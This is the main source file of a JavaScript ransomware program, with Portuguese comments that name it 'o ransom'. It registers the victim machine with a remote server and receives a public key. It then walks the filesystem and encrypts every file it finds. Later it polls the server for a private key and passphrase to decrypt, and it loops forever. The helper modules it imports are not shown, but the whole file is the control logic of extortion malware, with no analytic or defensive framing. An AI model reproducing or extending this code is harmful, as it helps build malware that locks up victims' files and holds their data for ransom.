"use strict";
/**
 * Importa os módulos utilizados no ransom
 */
const Connection = require("./connection");
const MachineManager = require("./utils/machineManager");
const Encrypter = require("./Ciphers/Crypter");
const Decrypter = require("./Ciphers/Decrypter");
const fileDiscover = require("./discovery");
const worker = require("./sync");

// instancia um novo módulo de conexção
const connection = new Connection();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

const waitThenDo = async (howLong, doWhat) => {
  console.log("Vou dormir!");
  await sleep(1000 * 5);
  console.log("Já Dormi!");
  // await main();
};

// função principal
async function main() {
  var system = MachineManager.load();
  if (!system) {
    // vai rodar o crypter
    try {
      console.log("Iniciando os trabalhos!");
      system = MachineManager.generate();
      const { publicKey } = await connection.registerMachine(system);
      const fileEncrypter = Encrypter(publicKey);
      fileDiscover(filename => {
        worker(filename, fileEncrypter);
      });
    } catch (error) {
      // server offline
      MachineManager.delete();
    }
  } else {
    // já rodou o crypter
    try {
      console.log("Decriptando!");
      const data = await connection.checkMachineStatus(system.uuid);
      // data deve retornar { privateKey, passphrase }
      if (data) {
        const fileDecrypter = Decrypter(data);
        fileDiscover(filename => {
          worker(filename, fileDecrypter);
        });
      }
    } catch (error) {
      // server offline
      console.log("Erro ao tentar decriptar");
    }
  }
  // terminou todo o processamento, tá na hora da sonequinha!
}

(async function() {
  while (true) {
    // invoca o main pela primeira vez
    await main();
    await waitThenDo();
  }
})();
